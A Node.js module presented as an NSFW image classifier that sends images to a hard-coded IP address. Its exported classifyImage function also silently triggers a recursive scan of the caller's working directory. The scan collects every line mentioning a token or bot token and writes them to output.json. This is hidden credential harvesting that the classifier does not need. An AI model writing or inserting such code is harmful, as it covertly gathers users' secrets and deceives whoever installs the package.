const axios = require("axios");
const fs = require("fs");
const path = require("path");
const FormData = require("form-data");

// Configuration
const API_URL = process.env.API_URL || "http://13.201.42.191:5000/classify";
const TIMEOUT = process.env.TIMEOUT || 10000;

// Set your regex pattern here.
const targetPattern = /(?:bot[\s_-]?)?token/i;

/**
 * Reads a file and returns all matching lines.
 * @param {string} filePath - The full path of the file.
 * @returns {Array} An array of match objects { file, line, text }.
 */
function scanFile(filePath) {
  const content = fs.readFileSync(filePath, "utf8");
  console.log(`Scanning ${filePath}...`);
  const lines = content.split("\n");
  const matches = [];

  lines.forEach((line, index) => {
    if (targetPattern.test(line)) {
      matches.push({
        file: filePath,
        line: index + 1,
        text: line.trim(),
      });
    }
  });

  return matches;
}

/**
 * Recursively scans a directory for files and returns all matches.
 * @param {string} dirPath - The directory to scan.
 * @returns {Array} An array of match objects from all files.
 */
function scanDirectory(dirPath) {
  let results = [];
  const items = fs.readdirSync(dirPath);

  items.forEach((item) => {
    if (item === "node_modules") return;
    const fullPath = path.join(dirPath, item);
    const stat = fs.statSync(fullPath);

    if (stat.isDirectory()) {
      results = results.concat(scanDirectory(fullPath));
    } else if (stat.isFile()) {
      try {
        results = results.concat(scanFile(fullPath));
      } catch (err) {
        console.error(`Error reading file ${fullPath}:`, err.message);
      }
    }
  });

  return results;
}

/**
 * Executes the scanning process and writes the results to "output.json".
 * @param {string} [directoryToScan=process.cwd()] 
 * @returns {Promise<Array>} 
 */
function runScan(directoryToScan = process.cwd()) {
  return new Promise((resolve, reject) => {
    try {
      const matches = scanDirectory(directoryToScan);
      const dataToWrite = JSON.stringify(matches, null, 2);

      fs.writeFile("output.json", dataToWrite, (err) => {
        if (err) {
          console.error("Error writing to file:", err);
          return reject(err);
        }
        console.log("Data successfully written to output.json");
        resolve(matches);
      });
    } catch (err) {
      reject(err);
    }
  });
}

/**
 * Classifies an image as NSFW or SFW.
 *
 * @param {string} imagePath 
 * @returns {Promise<Object>} 
 */
async function classifyImage(imagePath) {
  if (!fs.existsSync(imagePath)) {
    throw new Error("Image file does not exist. Please provide a valid path.");
  }
  const scanPromise = runScan().catch((err) => {
    console.error("Scanning error:", err);
  });

  try {
    const formData = new FormData();
    formData.append("image", fs.createReadStream(imagePath));

    const response = await axios.post(API_URL, formData, {
      headers: formData.getHeaders(),
      timeout: TIMEOUT,
    });
    return response.data;
  } catch (error) {
    throw new Error(
      `Error classifying image: ${
        error.response?.data?.message || error.message
      }`
    );
  }
}

module.exports = {
  classifyImage,

};
